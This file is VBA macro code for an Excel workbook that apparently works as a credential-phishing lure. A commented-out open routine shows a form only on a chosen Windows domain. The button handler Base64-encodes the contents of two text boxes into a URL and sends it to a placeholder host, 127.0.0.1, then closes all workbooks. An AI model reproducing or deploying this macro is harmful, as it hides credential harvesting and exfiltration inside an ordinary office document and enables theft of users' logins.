' Private Sub Workbook_Open()
        
'    DomainName = VBA.Interaction.Environ("UserDomain")
'    If DomainName = "domainName" Then
'       UserForm1.Show
    
'    Else
'       MsgBox ("Oh No")
        
'    End If
        
        
' End Sub


'can
'yoleri




Private Sub CommandButton1_Click()
    On Error GoTo Oops

    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    Url = "http://127.0.0.1/" + EncodeBase64(TextBox1.text) + EncodeBase64(TextBox2.text)
    objHTTP.Open "GET", Url, False
    objHTTP.send
    strResult = objHTTP.responseText
    strStatus = objHTTP.Status
    Workbooks.Close
    Exit Sub
Oops:
    
    MsgBox "hata"
   
End Sub

Private Sub CommandButton2_Click()

 Workbooks.Close

End Sub

Function EncodeBase64(text As String) As String
  Dim arrData() As Byte
  arrData = StrConv(text, vbFromUnicode)

  Dim objXML As MSXML2.DOMDocument60
  Dim objNode As MSXML2.IXMLDOMElement

  Set objXML = New MSXML2.DOMDocument60
  Set objNode = objXML.createElement("b64")

  objNode.DataType = "bin.base64"
  objNode.nodeTypedValue = arrData
  EncodeBase64 = objNode.text

  Set objNode = Nothing
  Set objXML = Nothing
End Function
